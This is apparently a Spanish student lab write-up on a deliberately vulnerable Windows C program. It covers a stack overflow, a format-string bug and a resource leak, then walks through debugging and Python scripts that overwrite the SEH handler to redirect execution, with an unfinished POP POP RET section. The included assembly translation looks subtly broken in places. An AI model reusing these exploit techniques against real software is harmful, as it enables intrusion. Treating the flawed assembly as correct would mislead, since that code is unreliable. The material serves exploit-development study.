
# An√°lisis del c√≥digo del binario
```c
#include <stdio.h>
#include <string.h>

void call_me() {
	printf("You cannot call me, noob!\n");
}

void parse_file(char* filename){
	char url[16];
	char buffer[512];

	printf("Abriendo fichero %s ...\n", filename);

	FILE *f = fopen(filename, "r");
	if(f == NULL){
		printf("Fallo al abrir el fichero :(\n");
		return;
	}
	printf("Leyendo fichero %s ...\n", filename);

	fread(buffer, 1, 256, f);
	printf("Fichero leido! Contenido: \n");
	//printf(buffer);

	printf("\nBuscando URL en el fichero..\n");

	char* url_start = strstr(buffer, "http://");
	if(url_start == NULL){
		printf("URL no encontrada :(\n");
		return;
	}

	memcpy(url, url_start, 512);

	printf("URL: %s\n", url);

	fclose(f);
	return;
}

int main(int argc, char** argv) {
	if(argc != 2){
		printf("Uso: %s <fichero>\n", argv[0]);
		return -1;
	}

	parse_file(argv[1]);
	return 0;
}
```

Este binario amplia el binario [stack1](https://github.com/soniasalido/cybersecurity/blob/main/LABS/Investigating%20Malware/Master-ENIIT-Analisis-Malware-Reversing/stack-buffer-overflow/stack1/stack1.md). Lee el fichero que se pasa como par√°metro y busca en el contenido la subcadena `"http://"`. 
- Si no la encuentra: muestra en pantalla: `URL no encontrada :(` y vuelve.
- Si la encuentra, hace:
  ```c
  memcpy(url, url_start, 512);
  printf("URL: %s\n", url);
  ```
  - Copia desde donde empieza "http://" hasta 512 bytes (esto est√° mal, porque url solo tiene 16 bytes) y,
  - luego intenta imprimirlo como cadena.

El programa lee los primeros 256 bytes de un fichero, busca dentro de ellos una cadena que empiece por "http://", y si la encuentra intenta copiarla a url y mostrarla por pantalla (aunque lo hace de forma insegura y con desbordamiento de buffer).



```asm
asm
section .data
    fmt_open db "Abriendo fichero %s ...", 10, 0
    fmt_fail_open db "Fallo al abrir el fichero :(", 10, 0
    fmt_reading db "Leyendo fichero %s ...", 10, 0
    fmt_read_done db "Fichero leido! Contenido: ", 10, 0
    fmt_search_url db 10, "Buscando URL en el fichero..", 10, 0
    fmt_url_not_found db "URL no encontrada :(", 10, 0
    fmt_url db "URL: %s", 10, 0
    fmt_usage db "Uso: %s <fichero>", 10, 0
    call_me_msg db "You cannot call me, noob!", 10, 0
    http_str db "http://", 0

section .bss
    url resb 16
    buffer resb 512
    filename resb 256

section .text
    global main
    extern printf
    extern fopen
    extern fread
    extern fclose
    extern strstr
    extern memcpy

; void call_me()
call_me:
    push rbp
    mov rbp, rsp
    lea rdi, [rel call_me_msg]
    xor eax, eax
    call printf
    pop rbp
    ret

; void parse_file(char* filename)
; argument: rdi = filename pointer
parse_file:
    push rbp
    mov rbp, rsp
    sub rsp, 512+16+8  ; allocate space for buffer(512), url(16), and align stack

    ; Save filename pointer on stack for reuse
    mov [rbp-8], rdi

    ; printf("Abriendo fichero %s ...\n", filename);
    lea rdi, [rel fmt_open]
    mov rsi, rdi
    mov rsi, [rbp-8]
    xor eax, eax
    call printf

    ; FILE *f = fopen(filename, "r");
    mov rdi, [rbp-8]
    lea rsi, [rel mode_r]
    call fopen
    ; check if NULL
    test rax, rax
    je .fail_open
    mov r12, rax ; save FILE* in r12

    ; printf("Leyendo fichero %s ...\n", filename);
    lea rdi, [rel fmt_reading]
    mov rsi, [rbp-8]
    xor eax, eax
    call printf

    ; fread(buffer, 1, 256, f);
    mov rdi, rbp
    sub rdi, 512+16+8
    add rdi, 0 ; buffer address (rbp-512-16-8 + 0 offset)
    mov rsi, 1
    mov rdx, 256
    mov rcx, r12
    call fread

    ; printf("Fichero leido! Contenido: \n");
    lea rdi, [rel fmt_read_done]
    xor eax, eax
    call printf

    ; printf("\nBuscando URL en el fichero..\n");
    lea rdi, [rel fmt_search_url]
    xor eax, eax
    call printf

    ; char* url_start = strstr(buffer, "http://");
    mov rdi, rbp
    sub rdi, 512+16+8
    add rdi, 0 ; buffer address
    lea rsi, [rel http_str]
    call strstr
    test rax, rax
    je .url_not_found

    ; memcpy(url, url_start, 512);
    mov rdi, rbp
    sub rdi, 512+16+8
    add rdi, 512 ; url address (rbp-512-16-8 + 512 offset)
    mov rsi, rax ; url_start
    mov rcx, 512
    call memcpy

    ; printf("URL: %s\n", url);
    lea rdi, [rel fmt_url]
    mov rsi, rbp
    sub rsi, 512+16+8
    add rsi, 512 ; url address
    xor eax, eax
    call printf

    ; fclose(f);
    mov rdi, r12
    call fclose

    add rsp, 512+16+8
    pop rbp
    ret

.fail_open:
    lea rdi, [rel fmt_fail_open]
    xor eax, eax
    call printf
    add rsp, 512+16+8
    pop rbp
    ret

.url_not_found:
    lea rdi, [rel fmt_url_not_found]
    xor eax, eax
    call printf
    mov rdi, r12
    call fclose
    add rsp, 512+16+8
    pop rbp
    ret

section .rodata
    mode_r db "r", 0

; int main(int argc, char** argv)
; argc in edi, argv in rsi
main:
    push rbp
    mov rbp, rsp
    sub rsp, 32

    ; check argc != 2
    cmp edi, 2
    je .argc_ok

    ; printf("Uso: %s <fichero>\n", argv[0]);
    lea rdi, [rel fmt_usage]
    mov rsi, [rsi] ; argv[0]
    xor eax, eax
    call printf

    mov eax, -1
    jmp .end_main

.argc_ok:
    ; parse_file(argv[1])
    mov rdi, [rsi+8] ; argv[1]
    call parse_file

    mov eax, 0

.end_main:
    add rsp, 32
    pop rbp
    ret
```


## Problemas de seguridad
### 1. buffer no est√° terminado en '\0'
```c
char buffer[512];
...
fread(buffer, 1, 256, f);
...
char* url_start = strstr(buffer, "http://");
```
donde:
- fread lee hasta 256 bytes sin a√±adir '\0'.
- strstr espera una cadena C terminada en '\0'.
- Como buffer no est√° terminado, strstr puede leer m√°s all√° de esos 256 bytes (memoria basura) ‚Üí comportamiento indefinido.

### 2. Desbordamiento de `url`
```c
char url[16];
...
memcpy(url, url_start, 512);
```
donde:
- `url` tiene tama√±o 16 bytes.
- Estamos copiando 512 bytes desde `url_start` a `url`.
- Es un stack-based buffer overflow de manual: pisamos todo lo que haya despu√©s de url en la pila (variables locales, puntero de retorno, etc.).

Adem√°s:
- No se a√±ade '\0' a url, as√≠ que luego:
```c
printf("URL: %s\n", url);
```
donde:
- espera que `url` est√© terminada en '\0', y volver√° a leer memoria fuera del buffer.

### 3. Posible format string (aunque est√° comentado)
```c
//printf(buffer);
```
donde:
- Si esto se descomenta, tendremos una format string vulnerability:
	- `printf` interpreta el contenido de buffer como formato, no como texto plano.
	- Si el fichero contiene cosas como `%x`, `%n`, etc., podemos leer/escribir memoria.

 ### 4. Fugas de recurso (fichero sin cerrar)
Si no se encuentra la URL:
```c
if(url_start == NULL){
    printf("URL no encontrada :(\n");
    return;
}
```
donde:
- Ese return sale de la funci√≥n sin hacer `fclose(f)`, as√≠ que el fichero queda abierto.


# Primera ejecuci√≥n del binario

```python
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 600
p += struct.pack("<I", 0)
p += struct.pack("<I", 0)
p += struct.pack("<I", 0)
p += struct.pack("<I", 0x42424242)
p += struct.pack("<I", CALL_ME)

with open("exp.txt", "wb") as f:
    f.write(p)
```
![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena.png)
donde:
- El EIP est√° en 00401620 que x32dbg rotula como: `<JMP.&memcpy>`. En ensamblador estamos viendo el momento exacto en que va a ocurrir eso:
  ```c
  memcpy va a copiar 256 bytes (0x100)
  ```
- Pero el buffer de destino `(url)` solo tiene 16 bytes.


**Resultado:**
- memcpy empieza a escribir las A en url
- sigue escribiendo m√°s all√°: pisa otras variables locales, el EBP guardado y, si sigues, el ret de la funci√≥n (direcci√≥n de retorno).
- eso es el stack-based buffer overflow que estamos intentando observar.

![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-2.png)
donde:
- EAX = 0022FE88
- [ebp-20] (la variable local url) es la direcci√≥n 0x0022FE88.
- En esa direcci√≥n el contenido es 0x70747468 = "http" en little endian.
  ![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-3.png)

**Conclusi√≥n:**
- memcpy ya ha copiado la cadena que empezaba en `url_start ("http://AAAAAA...")` encima del `buffer url`.


![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-4.png)



![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-5.png)



![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-6.png)



![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-7.png)
donde:
- EIP = 0040163E ‚Üí estamos en el `call <JMP.&fclose>`.
- En el panel de registros: `EAX = 41414141`.
- En el Default (stdcall): `[esp] = 41414141` ‚Üí es decir, el argumento que se va a pasar a `fclose` es `0x41414141`.
- Eso significa que nuestro overflow:
	- Ha sobrescrito la variable local `f` (el FILE * devuelto por fopen),
	- de manera que cuando el c√≥digo hace `fclose(f)`, en realidad est√° haciendo: `fclose((FILE*)0x41414141);` Es un puntero totalmente inv√°lido ‚Üí cuando entremos en msvcrt!fclose, en cuanto intente dereferenciar ese puntero, lo normal es que se produzca una violaci√≥n de acceso y el programa se estrelle antes incluso de hacer el `ret` de `parse_file`.


# An√°lisis punto 00401608
![stack2-00401613](capturas/stack2-00401613.png)
```c
00401608  C74424 08 00010000   mov dword ptr ss:[esp+8], 100h	; 0x100 = 256 - Esto tercer argumento de memcpy ‚Üí el tama√±o - Escribe el valor 0x100 (256d) en [esp+8]
00401610  8945 F0             mov dword ptr ss:[ebp-10], eax	; Guarda en la variable local situada en [ebp-10] el valor de EAX. Resultado `url_start = EAX;`
00401613  894424 04           mov dword ptr ss:[esp+4], eax		; `[esp+4]` es el segundo par√°metro de `memcpy ‚Üí src`.  Resultado: src = url_start;
00401617  8D45 E0             lea eax, dword ptr ss:[ebp-20]	; Calcula la direcci√≥n de `[ebp-20]` y la mete en EAX.  Resultado: EAX = &url;
0040161A  890424              mov dword ptr ss:[esp], eax		; `[esp]` es el primer par√°metro de `memcpy ‚Üí dst`. Resultado: dst = url;
0040161D  E8 47110000         call <JMP.&memcpy>				; Llama a `memcpy` con los tres par√°metros que acabamos de preparar en la pila.
```

Ese bloque es la preparaci√≥n de la llamada a memcpy que viene de:
```c
memcpy(url, url_start, 512);   // el compilador la ha dejado en 256 (0x100)
```

En 32 bits, los par√°metros de una funci√≥n como `memcpy(dst, src, size)` se pasan as√≠ en la pila:
- `[esp]` ‚Üí 1er par√°metro ‚Üí `dst`
- `[esp+4]` ‚Üí 2¬∫ par√°metro ‚Üí `src`
- `[esp+8]` ‚Üí 3er par√°metro ‚Üí `size`


**<mark>En el v√≠deo de tutor√≠a, aparece un cambio en este punto:</mark>**
```c
00401608  C74424 08 00010000   mov dword ptr ss:[esp+8], 200h
```
![stack2-00401613-video-clase](capturas/stack2-00401613-video-clase.png)

**<mark>Este detalle ¬øcambia significativamente la explotacion? Si no se edita manualmente ese valor y se cambia por 200, no se puede explotar la vulnerabilidad.</mark>**
![stack2-00401613-edicion-manual](capturas/stack2-00401613-edicion-manual.png)

En mi binario copia 256 bytes:
```c
mov [esp+8], 100h   ; 256 bytes
```

En el binario del v√≠deo copia 512 bytes:
```c
mov [esp+8], 200h   ; 512 bytes
```

En este ejercicio se hace una explotaci√≥n basada en SEH (Structured Exception Handler), es decir, manipulando la cadena de manejadores de excepciones que Windows almacena en la pila. La posici√≥n del SEH en la pila es fija para ese binario.
Pero el desbordamiento tiene que alcanzar esa posici√≥n para afectarlo.

**Conceptualmente podr√≠amos ver la explotaci√≥n de este binario:** Un binario Windows 32-bit organiza la pila as√≠:
```
+------------------+
| Variables locales |
+------------------+
| Saved EBP         |
+------------------+
| SEH Frame:        |
|   nSEH            |
|   SEH             |
+------------------+
| m√°s cosas...      |
```
donde:
- url est√° al principio de la zona local: 16 bytes.
- Luego variables intermedias.
- Luego EBP.
- Luego la estructura SEH.

En el v√≠deo de la tutor√≠a: `distancia(url ‚Üí SEH) ‚âà 400 bytes`  
‚Üí Necesita 512 bytes para alcanzarlo.  
‚Üí Con 256 no llega.  

En mi binario con `mov [esp+8], 100h`:
- First chance exception on 6FF63D9D (C0000005, EXCEPTION_ACCESS_VIOLATION) y a la derecha: ESI = 41414141 --> el overflow ha sobreescrito registros y memoria, pero‚Ä¶
	- üí• **NO ha sobreescrito SEH.**
	- üí• La cadena SEH sigue intacta (En el panel SEH: ‚ÄúEnd of SEH chain‚Äù).
	- La excepci√≥n ocurre dentro de msvcrt.dll (fclose, printf‚Ä¶), pero Windows no est√° llamando al ‚ÄúSEH modificado‚Äù porque NO est√° modificado.
 	- Resultado: **No podemos explotar el SEH.**
![stack2-00401613-mi-binario](capturas/stack2-00401613-mi-binario-100.png)
![stack2-00401613-mi-binario](capturas/stack2-00401613-mi-binario-100-2.png)



En el binario con mov `[esp+8], 200h`:
- S√ç SE SOBREESCRIBE EL SEH.
- El overflow s√≠ alcanza el registro SEH y lo corrompe.
- Resultado: Se puede hacer explotaci√≥n SEH tal como muestra el profesor en el v√≠deo de la tutor√≠a.
![stack2-00401613-mi-binario-dato-200](capturas/stack2-00401613-mi-binario-dato-200.png)
![stack2-00401613-mi-binario-dato-200](capturas/stack2-00401613-mi-binario-dato-200-1.png)
![stack2-00401613-mi-binario-dato-200](capturas/stack2-00401613-mi-binario-dato-200-2.png)



# Explotaci√≥n de la vulnerabilidad
Exploit para explotar la vulnerabilidad:
```c
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'

with open("exp2.txt", "wb") as f:
    f.write(p)
```


```c
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 309 + b'BBBB' + b'CCCC'
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0x42424242)
#p += struct.pack("<I", CALL_ME)

with open("exp3.txt", "wb") as f:
    f.write(p)
```

Otro script:
```c
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 309 + b'BBBB'
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0x42424242)
p += struct.pack("<I", CALL_ME)

with open("exp4.txt", "wb") as f:
    f.write(p)
```

![stack2-you-cannot-call-me](capturas/stack2-you-cannot-call-me.png)

Se explota la vulnerabilidad ya que hemos conseguido modificar el valor de la funci√≥n que maneja la excepci√≥n.  

![stack2-you-cannot-call-me](capturas/stack2-you-cannot-call-me-2.png)
donde:
- Vemos valores de las Aes.
- Despues tenemos el primer elemento de la lista enlazada del manejador de excepciones ‚Üí  Pointer to SEH_Record `0022FFC4 | 42424242`
- Despu√©s tenemos la direcci√≥n de la funci√≥n que maneja la excepci√≥n ‚Üí `0022FFC8 | 00401530`. Que la hemos sobreescrito con la direcci√≥n de la funci√≥n `call_me`.
- Cuando se intenta manejar la excepci√≥n, llama a la funci√≥n `call_me`.


# Ejecuci√≥n de la calculadora

## Localizaci√≥n gadgets POP POP RET v√°lidos para el binario stack2.exe
En una explotaci√≥n SEH (Structured Exception Handler) en Windows, el objetivo es sobreescribir la estructura SEH para desviar la ejecuci√≥n hacia nuestro shellcode. Para hacerlo, necesitamos un gadget muy espec√≠fico dentro del binario o de alguna DLL que NO tenga SafeSEH / ASLR / DEP activo: üéØ POP POP RET

üéØ POP POP RET: Es una secuencia de instrucciones ensamblador:
```c
POP reg
POP reg
RET
```

üöÄ ¬øPor qu√© es tan importante en un exploit SEH? Cuando ocurre una excepci√≥n en Windows, el sistema hace:
- Busca en el stack la estructura SEH.
- Obtiene el handler (el puntero al manejador).
- Lo ejecuta cuando no existe SafeSEH / SEHOP.
- Pero ANTES de saltar al handler‚Ä¶ Windows hace dos POPs para limpiar la estructura SEH:
  ```c
  [ next SEH pointer ]   <-- offset 0
  [ exception handler ]   <-- offset +4   <-- ESTE lo sobreescribmos
  ```

  Cuando Windows entra al SEH:
  ```c
  POP reg   ; limpia next SEH
  POP reg   ; limpia el handler
  RET       ; salta a donde queramos
- üëâ Y ese RET saltar√° a nuestro c√≥digo malicioso en el stack (si controlamos EIP con un RET hacia nuestros datos).

**`EIP = 6FF5A030`:**
![stack2-calc](capturas/stack2-calc.png)
donde:
- xxxx.


**Primera Excepci√≥n en 6FF5A091:**
![stack2-calc](capturas/stack2-calc-2-c.png)
donde:
- La excepci√≥n ocurri√≥ dentro de `msvcrt.dll`, NO dentro de `stack2.exe`.
- Esto significa que nuestro desbordamiento pas√≥ completamente la funci√≥n vulnerable y termin√≥ corrompiendo estructuras internas usadas por `msvcrt` durante la limpieza del `stack` o la copia de memoria.
- Vemos `First chance exception`.
- El debugger nos deja continuar.
- Windows intenta ejecutar el `SEH` corrupto.
- ‚≠ê Entonces se ejecuta el `POP POP RET`.


**Ejecuci√≥n del `POP POP RET`:**
![stack2-calc](capturas/stack2-calc-3.png)


xxxx:
![stack2-calc](capturas/stack2-calc-5.png)

xxxx:
![stack2-calc](capturas/stack2-calc-4-b.png)
